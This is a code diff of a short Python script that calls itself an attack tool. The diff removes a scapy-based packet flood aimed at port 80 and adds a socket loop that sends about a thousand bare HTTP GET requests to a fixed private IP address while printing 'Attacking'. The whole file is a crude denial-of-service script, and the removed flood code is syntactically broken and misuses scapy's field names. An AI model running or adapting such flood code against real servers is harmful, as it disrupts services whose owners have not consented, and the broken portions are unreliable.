@@ -1,32 +1,25 @@
-from scapy.all import *
+import socket, sys, os
+import time
+
+ip = '192.168.185.3'
+what = 'aaa'
+port = 80
+
+print("][ Attacking " + ip + " ... ][")
+print("injecting " + what)
 
 
-def single_port_attack(source_IP, target_IP, source_port):
-    i = 1
-    while True:
-        IP1 = IP(source_IP=source_IP, destination=target_IP)
-        TCP1 = TCP(srcport=source_port, dstport=80)
-        pkt = IP1 / TCP1
-        send(pkt, inter=.001)
-
-        i = i + 1
-
-
-def multiple_port_attack(source_IP, target_IP, source_port):
-    i = 1
-    while True:
-        for source_port in range(1, 65535)
-            IP1 = IP(source_IP=source_IP, destination=target_IP)
-            TCP1 = TCP(srcport=source_port, dstport=80)
-            pkt = IP1 / TCP1
-            send(pkt, inter=.001)
-
-            i = i + 1
+def attack(i):
+    # pid = os.fork()
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ip, port))
+    print(">> GET /" + what + " HTTP/1.1 | packet: " + str(i))
+    s.send(b"GET /" + what.encode() + b" HTTP/1.1\r\n")
+    s.send(b"Host: " + ip.encode() + b"\r\n\r\n")
+    s.close()
 
 
-source_IP = input("Enter IP address of Source: ")
-target_IP = input("Enter IP address of Target: ")
-source_port = int(input("Enter Source Port Number:"))
+for i in range(1, 1000):
+    attack(i)
+    time.sleep(1)
 
-# single_port_attack(source_IP, target_IP, source_port)
-# multiple_port_attack(source_IP, target_IP, source_port)
